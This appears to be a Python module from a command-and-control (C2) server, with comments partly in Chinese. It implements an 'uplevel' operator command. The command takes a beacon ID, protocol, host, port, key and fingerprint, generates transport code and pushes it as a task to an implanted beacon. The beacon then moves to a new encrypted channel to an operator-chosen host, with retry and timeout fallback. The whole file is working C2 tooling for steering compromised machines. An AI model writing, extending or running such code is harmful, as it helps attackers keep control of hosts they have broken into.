"""uplevel — 协议升级（U2/U3/U4）:
uplevel [beacon_id] <protocol> <host> <port> <key_hex> [fingerprint]
"""

from server.task_queue import Task
from server.s_modules.transport_base import build_upgrade_task
from server.core.events import EVT_UPLEVEL


def run(disp, args):
    if len(args) < 4:
        return ("[!] usage: uplevel [beacon_id] <protocol> <host> <port> "
                "<key_hex> [fingerprint] [retry] [timeout]")

    bid, rest = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon (use <beacon_id>)"

    protocol, host, port = rest[0], rest[1], rest[2]
    key_hex = rest[3]
    fingerprint = rest[4] if len(rest) > 4 else ""
    # 多级回退参数：retry=连续失败 N 次退层；timeout=连续失败 N 秒退层
    # 两者都 <=0 → 该层永不退出（死磕最高线路）
    try:
        retry = int(rest[5]) if len(rest) > 5 and rest[5] else 3
        timeout = int(rest[6]) if len(rest) > 6 and rest[6] else 0
    except ValueError:
        return "[!] invalid retry/timeout (整数)"

    try:
        port = int(port)
    except ValueError:
        return f"[!] invalid port: {rest[2]}"

    gen_name = f"transport_{protocol}"
    if not disp.smods or not disp.smods.get_module(gen_name):
        return f"[!] unknown protocol: {protocol} (可用: tls)"

    gen_args = [host, str(port), key_hex]
    if fingerprint:
        gen_args.append(fingerprint)
    try:
        transport_code = disp.smods.run(gen_name, gen_args)
    except Exception as e:
        return f"[!] transport generate failed: {e}"

    code = build_upgrade_task(protocol, host, port, key_hex, transport_code,
                              retry=retry, timeout=timeout)
    task = Task(code=code)
    result = disp.push_task(bid, task)
    if result.startswith("[+]"):
        try:
            disp.audit.emit(EVT_UPLEVEL, bid, protocol=protocol,
                            host=host, port=port)
        except Exception:
            pass
    return result
